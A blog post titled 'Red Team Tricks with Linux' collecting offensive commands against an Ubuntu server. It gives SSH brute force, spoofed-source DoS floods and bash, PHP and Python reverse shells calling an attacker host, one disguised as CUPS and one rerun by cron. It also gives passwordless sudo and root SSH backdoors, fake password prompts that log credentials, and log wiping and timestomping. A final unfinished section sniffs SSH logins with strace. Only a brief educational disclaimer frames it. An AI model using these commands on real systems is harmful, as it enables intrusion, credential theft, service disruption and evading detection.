---
layout: post
title: Red Team Tricks with Linux
date: 2019-09-16 21:46:25.000000000 +03:00
categories:
- Linux
- Linux as a server
tags:
- Bash
- Linux
- Red Team
- Reverse shell
- Server
- SSH
- Ubuntu
- Ubuntu 16.04
permalink: "/2019/red-team-tricks-with-linux/"
---
I have collected some Linux commands and tricks that Red Team can use for their evil deeds. All these commands and tricks have been tested against Ubuntu 16.04 server and attackers computer is Kali Linux 2019.3.

## Legal disclaimer

The methods are presented for educational purposes only.  
**You are responsible** for not using the techniques for **illegal purposes**.

## Label meanings

**[victim ip address]** means add your target IP address example 127.0.0.1  
**[victim ip address zone]** means add your target IP address zone example 10.1.1.0/24  
**[decoy ip address]** means add a decoy address that you want to frame to be the attacker example 127.0.0.2  
**[domain]** means add a victim domain example localhost  
**[username]** means add a username example admin  
**[attacker domain]** means add a hostile computer's ip address example 127.0.0.3  
**[target folder/file]** means add a target folder or file that you want to change example /home/username/newfile  
**[source folder/file]** means add a source folder or file that you want to use as reference example /bin

# Scanning and denying

## Nmap

Nmap is a network scanning tool.

Scan 1000 most common ports. Delay is about 1 second.

{% highlight shell %}
# nmap --top-ports 1000 -T2 [victim ip address]
{% endhighlight %}

Scan all ports aggressively

{% highlight shell %}
# nmap -p- -T4 [victim ip address]
{% endhighlight %}

Try to determine Operation system. Scan 1000 most common ports and try to determine service and version.

{% highlight shell %}
# nmap -O -sV --top-ports 1000 -T4 [victim ip address]
{% endhighlight %}

Scan insane fast in parallel and use decoys. In a target computer it looks like 3 different IP addresses are trying to scan it ports.

{% highlight shell %}
# nmap -p- -T5 --min-parallelism 5 [victim ip address zone] -D[decoy ip address],[decoy ip address]
{% endhighlight %}

## Hydra

Hydra is a brute force tool.

Brute forcing SSH account. Try to brute force 4 length password that contains only letters a and o. Delay is 1 second. Brute forcing is stopped if correct username and password is found.

{% highlight shell %}
# hydra -f -t 1 -l [username] -V -x 4:4:ao [victim ip address] ssh
{% endhighlight %}

## Slowhttptest

Slowlori attack is opening connections to HTTP server and keeps connections open. This makes web server to be very slow or unreachable.

Open 1000 connection and send only unfinished HTTP requests. Open 200 new connections per second and keep connections open by sending GET method in every 10 second with maximum length of 24 and wait 3 seconds for response.

{% highlight shell %}
# slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://[victim ip address or domain] -x 24 -p 3
{% endhighlight %}

## DOS

Take lot of TCP connections to target

{% highlight shell %}
# nping --tcp-connect --rate=1000000 --count 1000000 [victim ip address or domain]
{% endhighlight %}

Send much as possible TCP connections to target to port 21 and change source address to a decoy IP address. Flood by sending 10000 packets using SYN flag and data size is 120.

{% highlight shell %}
$ sudo hping3 -V -c 10000 -d 120 -S -p 21 --flood [victim ip address] -a [decoy ip address]
{% endhighlight %}

# Reverse shells

## Bash reverse shell

In attacker's computer listen 51920 port using Netcat

{% highlight shell %}
# nc -l -p 51920
{% endhighlight %}

Victim is connecting to attacker and opening reverse shell

{% highlight shell %}
# /bin/bash -i >& /dev/tcp/[attacker ip address]/51920 0>&1
{% endhighlight %}

You can also create a script that will try to open a reverse shell in every 5 minute

{% highlight shell %}
# nano /etc/cron.d/update_check
*/5 * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/[attacker ip address]/51920 0>&1'
{% endhighlight %}

## Reverse shell using PHP site

Install Apache and PHP to victim's computer and create PHP file that will open a reverse shell when the page is requested by HTTP protocol.

{% highlight shell %}
# apt install apache2 php libapache2-mod-php
# adduser www-data sudo
# passwd www-data

# nano /var/www/html/example.php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/" . $_GET["x"] . "/" . $_GET["y"] . " 0>&1'"); ?>

# touch /var/www/html/example.php -r /var/www/html/index.html
# service apache2 restart
{% endhighlight %}

In attacker's computer listen 51920 port using Netcat and send HTTP request to malicious site. With HTTP request the victim's computer will open the reverse shell

{% highlight shell %}
# nc -l -p 51920
# curl 'http://[victim ip address]/example.php?x=[attacker domain]&y=51920'
{% endhighlight %}

This is how you can give password using only one line example in reverse shell

{% highlight shell %}
$ echo 'password' | sudo -S command
{% endhighlight %}

## Python site reverse shell and fake it to look like CUPS

Give a sudo rights to user nobody without need to give a password

{% highlight shell %}
# nano /etc/sudoers.d/nobody
nobody ALL=(ALL) NOPASSWD:ALL
{% endhighlight %}

Fake Python to look like CUPS, create a Python script and start a Python server

{% highlight shell %}
# python -V
Python 2.7.12

# cp /usr/bin/python /usr/bin/cups
# mkdir -p /var/www/cgi-bin
# nano /var/www/cgi-bin/index.py

#! /usr/bin/cups  
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("[attacker domain]",51920));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);

# chmod a+x /var/www/cgi-bin/index.py
# cd /var/www/
# /usr/bin/cups -m CGIHTTPServer 631
{% endhighlight %}

If you would NMAP victim's computer with default options it would look like ipp(CUPS) service is running

{% highlight shell %}
# nmap -p 631 [victim ip address]
PORT    STATE SERVICE
631/tcp open  ipp
{% endhighlight %}

In attacker's computer listen 51920 port using Netcat and send HTTP request to malicious site

{% highlight shell %}
# nc -l -p 51920
# curl 'http://[victim ip address]:631/cgi-bin/index.py'
{% endhighlight %}

# SSH tricks and stealing passwords

## SSH listening different port using reverse shell

Add PORT 2222 end of the /etc/ssh/sshd_config

{% highlight shell %}
# echo PORT 2222 >> /etc/ssh/sshd_config
{% endhighlight %}

Restart SSH daemon

{% highlight shell %}
# service ssh restart
{% endhighlight %}

Now you can take SSH to port 2222

{% highlight shell %}
# ssh [username]@[victim ip address] -p 2222
{% endhighlight %}

## SSH Public Key Authentication

Create key pair on hostile's computer, move public key to victim's computer and take SSH connection to it

{% highlight shell %}
# ssh-keygen
# ssh-copy-id [username]@[victim ip address]
# ssh [username]@[victim ip address]
{% endhighlight %}

On victim's computer modify sshd_config allow the root to login, change SSH to find public keys also from /etc/ssh/authorized_keys and move public key to that location.

{% highlight shell %}
# nano /etc/ssh/sshd_config
PermitRootLogin yes
AuthorizedKeysFile %h/.ssh/authorized_keys /etc/ssh/authorized_keys

# cp /home/[username]/.ssh/authorized_keys /etc/ssh/
# chown root:root /etc/ssh/authorized_keys
# chmod +r /etc/ssh/authorized_keys
# service ssh restart
# touch /etc/ssh/sshd_config -r /srv
# touch /etc/ssh/authorized_keys -r /srv
{% endhighlight %}

Now you can take SSH connection without password using root (or any other user) from hostile computer

{% highlight shell %}
# ssh root@[victim ip address]
{% endhighlight %}

## Steal SSH password using bashrc

Modify bash.bashrc so it looks like first password went wrong and you need to write it again, but actually it steals victim's password and adds it to a file

{% highlight shell %}
# nano /etc/bash.bashrc
{% endhighlight %}

Add these line to end of the bash.bashrc file

{% highlight shell %}
clear
echo "$(whoami)@$(hostname -I)'s password:"
echo "Permission denied, please try again."
read -s -p "$(whoami)@$(hostname -I)'s password: "  password
echo "$password" >> /tmp/password.txt
echo   
{% endhighlight %}

## Sudo alias and steal sudo password

**This needs permanent solution to add alias and better way to do cut**  
Create file that asks sudo password, runs the last command and steals the password and adds it to a file

{% highlight shell %}
# nano /bin/admin
read -s -p "[sudo] password for $(whoami): "  password
echo
echo $password >> /tmp/sudo_password.txt
echo $password | /usr/bin/sudo -S $(history 1 | cut -c 13-)  
{% endhighlight %}

Give execute permissions to that file and give the script to sudo alias

{% highlight shell %}
# chmod +rx /bin/admin
# alias sudo="/bin/admin"
{% endhighlight %}

Now every time victim is running sudo [command] script asks password, steals the password and runs the command what victim wanted to run.

After this we can hide this alias modification by modifying the alias command

{% highlight shell %}
# alias > /bin/alias_old
# alias alias="cat /bin/alias_old"
{% endhighlight %}

# Cleaning your evil deeds

## Erasing history

Remove old history

{% highlight shell %}
# rm -r ~/.bash_history
{% endhighlight %}

Clean session history and exit

{% highlight shell %}
# history -c && exit
{% endhighlight %}

Link history to /dev/null so history does not save anything

{% highlight shell %}
# ln -sf /dev/null ~/.bash_history
{% endhighlight %}

## Clean logs

Delete all useful log files

{% highlight shell %}
# rm -r /var/log/apache2
# rm -r /var/log/apt
# rm /var/log/mail*
# rm /var/log/dpkg.log
# rm /var/log/syslog*
# rm /var/log/auth*
{% endhighlight %}

## Folder and File time modifications

Check a folder or a file creation and modification time

{% highlight shell %}
# stat [target folder/file]
{% endhighlight %}

Change a folder or a file creation and modification time to YYYYMMDDhhmm

{% highlight shell %}
# touch -t 201212211111 [target folder/file]
{% endhighlight %}

Change a folder or a file modification time to YYYYMMDDhhmm

{% highlight shell %}
# touch -mt 201212211111 [target folder/file]
{% endhighlight %}

Copy creation and modification time from other file or folder

{% highlight shell %}
# touch [target folder/file] -r [source folder/file]
{% endhighlight %}

List all files that has been changed in 7 days

{% highlight shell %}
# find [target folder] -iname "*" -atime -7 -type f
{% endhighlight %}

List all folders that has been changed in 7 days

{% highlight shell %}
# find [target folder] -iname "*" -atime -7 -type d
{% endhighlight %}

Change creation and modification time for all files that has been modified in 7 days

{% highlight shell %}
# touch -t 201212211111 $(find [target folder] -iname "*" -atime -7 -type f)
{% endhighlight %}

Change creation and modification time for all folders that has been modified in 7 days

{% highlight shell %}
# touch -t 201212211111 $(find [target folder] -iname "*" -atime -7 -type d)
{% endhighlight %}

Copy creation and modification time for all files that has been modified in 7 days. Source folder could be something like /bin

{% highlight shell %}
# touch $(find [target folder] -iname "*" -atime -7 -type f) -r [source folder/file]
{% endhighlight %}

# *******************************

# UNDER THIS DOES NOT WORK YEAT

# *******************************

## Get SSH credentials using strace

{% highlight shell %}
$ sudo strace -f -p $(pgrep -o sshd) -o sniff.txt -e trace=write
$ sudo /usr/bin/strace -f -p $(pgrep -o sshd) -e trace=write 2>&1 | grep '\\0\\0\\0\\4\|\\0\\0\\0\\10'
$ /usr/bin/strace -f -p $(pgrep -o sshd) -e trace=write 2>&1 | grep --line-buffered '\\0\\0\\0\\5\|\\0\\0\\0\\10' >> tiedosto.txt
$ /usr/bin/strace -f -p $(pgrep -o sshd) -e trace=write 2>&1 | grep --line-buffered -e "$(/bin/hostname)" -e '\\0\\0\\0\\10' >> tiedosto.txt
$ (/usr/bin/strace -f -p $(pgrep -o sshd) -e trace=write 2>&1 | grep --line-buffered -e "$(/bin/hostname)" -e '\\0\\0\\0\\10' >> /var/gnome.1) &
{% endhighlight %}

strace with reverse shell

{% highlight shell %}
$ sed -i -e 's/KillMode=process/KillMode=process\nExecStartPost=\/etc\/systemd\/system\/sshd.sh/g' /lib/systemd/system/ssh.service
$ printf '#!/bin/bash\n/usr/bin/strace -f -p $MAINPID -e trace=write 2>&1 | grep --line-buffered -e "$(/bin/hostname)" -e ' > /etc/systemd/system/sshd.sh
$ echo "'\\\\0\\\\0\\\\0\\\\10' >> /var/gnome.1 &" >> /etc/systemd/system/sshd.sh

$ chmod +x /etc/systemd/system/sshd.sh
$ systemctl daemon-reload
$ service ssh restart
{% endhighlight %}

strace with ssh

{% highlight shell %}
$ sudoedit /lib/systemd/system/ssh.service
ExecStartPost=/etc/systemd/system/sshd.sh

$ sudoedit /etc/systemd/system/sshd.sh
#!/bin/bash
(/usr/bin/strace -f -p $MAINPID -e trace=write 2>&1 | grep --line-buffered -e "$(/bin/hostname)" -e '\\0\\0\\0\\10' >> /var/gnome.1) &

$ chmod +x /etc/systemd/system/sshd.sh
$ systemctl daemon-reload
$ service ssh restart
{% endhighlight %}

grepping the password and username

{% highlight shell %}
$ cat sniff.txt | cut -d ' ' -f 4 | sort | uniq -c | sort -nr
$ grep '\\0\\0\\0\\10' sniff.txt
käyttäjä
$ grep '\\0\\0\\0\\4' sniff.txt
$ grep '@computer' sniff.txt
{% endhighlight %}

## DNS tunneling

{% highlight shell %}
$ apt-get install iodine
{% endhighlight %}

Server to listen

{% highlight shell %}
# iodined -f -P 12345 [target ip address] [hostile domain]
{% endhighlight %}

Client

{% highlight shell %}
$ sudo iodine -f -P 12345 -r [hostile domain]
{% endhighlight %}

## SPAM mail

## Windows create traffic using curl

{% highlight shell %}
set list=http://localhost1 http://localhost2
set list2=http://localhost3 http://localhost3

:loop
set /A test=%RANDOM% * 20 / 32768 + 1 + 20

ipconfig /flushdns

(for %%a in (%list%) do (
REM Chrome
	curl.exe -kLI "%%a"  -H "cache-control: max-age=0" -H "upgrade-insecure-requests: 1" -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" -H "sec-fetch-mode: navigate" -H "sec-fetch-user: ?1" -H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" -H "sec-fetch-site: none" -H "accept-encoding: gzip, deflate, br" -H "accept-language: en-US,en;q=0.9,fi;q=0.8"
	timeout %test%
))

(for %%a in (%list2%) do (
REM Firefox
	curl.exe -kLI "%%a"  -H "cache-control: max-age=0" -H "upgrade-insecure-requests: 1" -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "sec-fetch-mode: navigate" -H "sec-fetch-user: ?1" -H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" -H "sec-fetch-site: none" -H "accept-encoding: gzip, deflate, br" -H "accept-language: en-US,en;q=0.9,fi;q=0.8"
	timeout %test%
))

goto loop
{% endhighlight %}

https://linux.die.net/man/1/knockd  
AXFR query using tcp connection to port 53